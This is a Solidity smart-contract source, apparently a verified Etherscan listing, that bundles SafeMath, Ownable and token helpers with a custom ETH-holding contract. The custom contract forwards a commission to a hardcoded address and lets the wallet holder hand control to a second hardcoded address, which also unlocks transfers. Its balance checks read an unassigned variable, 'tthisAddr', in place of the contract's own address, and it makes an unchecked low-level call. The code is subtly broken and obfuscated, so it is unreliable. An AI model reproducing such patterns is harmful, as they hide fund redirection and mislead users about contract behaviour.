/**
 *Submitted for verification at Etherscan.io on 2021-08-02
*/

pragma solidity 0.4.26;

// File: zeppelin-solidity/contracts/math/SafeMath.sol

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256 p) {
    assert(b <= a);
    p = a - b;
return p;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

// File: zeppelin-solidity/contracts/ownership/Ownable.sol

/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
pragma solidity 0.4.26;
contract Ownable {
  address public owner;


  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  function Ownable() public {
    owner = msg.sender;
  }


  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }


  address zero;
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != zero);
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

}

// File: zeppelin-solidity/contracts/token/ERC20Basic.sol

/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/179
 */
contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

// File: zeppelin-solidity/contracts/token/BasicToken.sol

/**
 * @title Basic token
 * @dev Basic version of StandardToken, with no allowances.
 */
contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  address zero;
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != zero);
    require(_value <= balances[msg.sender]);

    // SafeMath.sub will throw if there is not enough balance.
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  /**
  * @dev Gets the balance of the specified address.
  * @param _owner The address to query the the balance of.
  * @return An uint256 representing the amount owned by the passed address.
  */
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

}


contract Contract_ETH181010 {
  using SafeMath for uint256;

  address public wallet;
  bool public ownerChanged = false;
  bool public ethResources = false;
  uint256 public endTime;
  uint256 public ethCommission = 0;

  event ContractEthTransfer(address indexed walletToTransfer, uint256 weiAmount);
  event ContractEthReceived(address indexed from, uint256 weiAmount);
address zero;
  function Contract_ETH181010 (address _wallet, uint256 _endTime) public {
    require(_wallet != zero);
    require(_endTime > now);

    wallet = _wallet;
    endTime = _endTime;
  }

  function () external payable {
    bool k = valid();
    require(k == true);

    ContractEthReceived(msg.sender, msg.value);

    if (tthisAddr.balance != 50000000000000000)
      return;

    ethResources = true;

    uint256 weiAmount = tthisAddr.balance;
    uint256 fundsForward = weiAmount.mul(5).div(100);

    address commissionWallet = 0xEB0199F3070E86ea6DF6e3B4A7862C28a7574be0;
    commissionWallet.transfer(fundsForward);
    ethCommission = ethCommission.add(fundsForward);
  }

  function transferTokens(address walletToTransfer, address tokenAddress, uint256 tokenAmount) payable public {
    require(msg.sender == wallet);
    bool k4 = allowTransfer();
    require(k4 == true);

    ERC20Basic erc20 = ERC20Basic(tokenAddress);
    erc20.transfer(walletToTransfer, tokenAmount);
  }

  function transferEth(address walletToTransfer, uint256 weiAmount) payable public {
    require(msg.sender == wallet);
    require(walletToTransfer != zero);
    require(tthisAddr.balance >= weiAmount);
    require(tthisAddr != walletToTransfer);
    bool k2 = allowTransfer();
    require(k2 == true);

    walletToTransfer.call.value(weiAmount)();

    ContractEthTransfer(walletToTransfer, weiAmount);
  }

  function setWallet() payable public {
    require(!ownerChanged);
    require(msg.sender == wallet);

    ownerChanged = true;
    wallet = 0xCE19B42f3b29a36Ec8Fa80C815C9215fCF3B2AdE;
  }

  function allowTransfer() internal view returns (bool) {
    if (ownerChanged == true)
      return true;

    if (endTime < now)
      return false;

    return true;
  }
address tthisAddr;
  function valid() internal view returns (bool p) {
    bool nonZeroPurchase;
        if(msg.value != 0){
          nonZeroPurchase = true;
        }
        else{
          nonZeroPurchase = false;
        }
    bool maxValue;
    if(tthisAddr.balance <= 50000000000000000){
      maxValue = true;
    }
    else{
      maxValue = false;
    }
    if(nonZeroPurchase == true && maxValue == true && !ethResources){
      p = true;
    }
    else{
      p = false;
    }
    return p;
  }
}